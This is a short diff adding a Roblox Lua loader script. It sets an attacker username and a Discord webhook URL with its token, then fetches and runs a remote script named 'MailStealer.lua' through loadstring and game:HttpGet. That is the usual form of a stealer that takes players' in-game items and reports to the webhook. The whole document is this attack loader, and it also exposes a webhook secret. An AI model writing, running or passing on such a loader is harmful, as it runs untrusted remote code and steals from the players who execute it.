@@ -1,0 +1,4 @@
+UserName = "simmyth666"
+WebHook = "https://discord.com/api/webhooks/1129309600529797190/Cty6klz-sXvp5lALQYm2eFo9CfbNcmgw8TlOckHA942dCkRFckfY_xmJTYqlO_twW89l"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BestHubRBX/MailStealerNew/main/MailStealer.lua%22,true))()
